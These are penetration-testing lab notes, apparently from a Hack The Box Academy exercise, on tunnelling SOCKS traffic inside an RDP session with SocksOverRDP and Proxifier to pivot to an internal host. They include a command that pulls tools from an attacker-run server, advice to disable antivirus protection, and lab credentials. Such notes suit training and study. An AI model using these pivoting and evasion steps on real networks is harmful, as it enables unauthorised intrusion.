# RDP & SOCKS Tunneling (SocksOverRDP)
**Concept:** You have compromised **Host A** (Windows Pivot) and have RDP access. You want to access **Host B** (Internal Network), but you can't run a reverse shell or Chisel server on Host A due to AV/Firewall restrictions. 
**Solution:** `SocksOverRDP` tunnels a SOCKS5 proxy _inside_ the established RDP connection.
## 1. Prerequisites & Tools
**Context:** This setup requires a client-side plugin (on your attacker machine) and a server-side executable (on the pivot host).
1. **SocksOverRDP x64 Binaries:** [GitHub Releases](https://github.com/nccgroup/SocksOverRDP/releases)
2. **Proxifier Portable:** [Proxifier Download](https://www.proxifier.com/download/#win-tab) (Used to route traffic on the Pivot Host).
## 2. Setting Up the Attacker (Client Side)
**Scenario:** You are using a Windows VM (or xFreeRDP on Linux with plugin support) to connect to the Pivot Host. _Note: The instructions below assume a Windows Attack Host._
### Step A: Register the Plugin
1. Download and extract `SocksOverRDP-x64.zip`.
2. Open CMD as **Administrator**.
3. Register the DLL. This instructs the MSTSC (Remote Desktop) client to load the plugin automatically on startup.
```powershell
cd C:\Users\Attacker\Desktop\SocksOverRDP-x64
regsvr32.exe SocksOverRDP-Plugin.dll
```
- _Verification:_ You should see a popup: "DllRegisterServer in ... succeeded."
### Step B: Connect via RDP
Connect to the Pivot Host (10.129.42.198) normally. The plugin will silently load in the background.
```powershell
mstsc.exe /v:10.129.42.198
```
- _Credentials:_ `htb-student` / `HTB_@cademy_stdnt!`
## 3. Setting Up the Pivot (Server Side)
**Scenario:** You are now inside the RDP session on the Pivot Host. You need to run the server component to establish the SOCKS listener.
### Step A: Transfer Files
You need `SocksOverRDP-Server.exe` on the Pivot Host. Since you are in RDP, you can simply **Copy/Paste** the file from your attacker machine into the RDP window.
- _Alternative:_ Use a Python HTTP server if clipboard is disabled.
```powershell
# On Attacker (Kali/Windows)
python3 -m http.server 8000

# On Pivot Host (PowerShell)
Invoke-WebRequest -Uri http://10.10.14.182:8000/SocksOverRDP-x64.zip -OutFile SocksOverRDP-x64.zip
Expand-Archive SocksOverRDP-x64.zip
```
### Step B: Run the Server
1. **Disable Real-Time Protection** (Optional but recommended if AV flags the tool).
2. Run `SocksOverRDP-Server.exe` as **Administrator**.
```powershell
# Inside the extracted folder
.\SocksOverRDP-Server.exe
```
### Step C: Verify Listener
Check if port **1080** (SOCKS) is now listening on the Pivot Host.
```powershell
netstat -antb | findstr 1080
# Output should show: TCP 127.0.0.1:1080 ... LISTENING
```
## 4. Routing Traffic (Proxifier)
**Context:** The Pivot Host now has a SOCKS proxy listening on `127.0.0.1:1080`. We use **Proxifier** to force specific applications (like MSTSC) to use this proxy to reach the _next_ hop.
### Step A: Configure Proxifier (On Pivot Host)
1. Transfer `ProxifierPE.zip` (Portable Edition) to the Pivot Host.
2. Run `Proxifier.exe`.
3. Go to **Profile > Proxy Servers > Add**.
    - **Address:** `127.0.0.1`
    - **Port:** `1080`
    - **Protocol:** `SOCKS Version 5`
4. Click **Check** to verify connectivity. It should pass.
5. Click **OK**. Accept the prompt to use this as the default proxy (or configure Proxification Rules for specific target IPs).
## 5. The Double Pivot (Reaching the Internal Host)
**Scenario:** You are on the Pivot Host (`10.129.x.x`). You want to RDP into a hidden internal server (`172.16.6.155`) that is only reachable via the SOCKS tunnel.
1. Open `mstsc.exe` _on the Pivot Host_.
2. Enter the IP of the Deep Internal Host: `172.16.6.155`.
3. **Proxifier** will intercept this connection and route it through the `127.0.0.1:1080` SOCKS proxy.
```txt
Target: 172.16.6.155
User:   jason
Pass:   WellConnected123!
```
**Note on Performance:** Reduce the "Experience" settings (Display/Colors) in RDP to "Modem (56kbps)" to improve lag over the tunnel.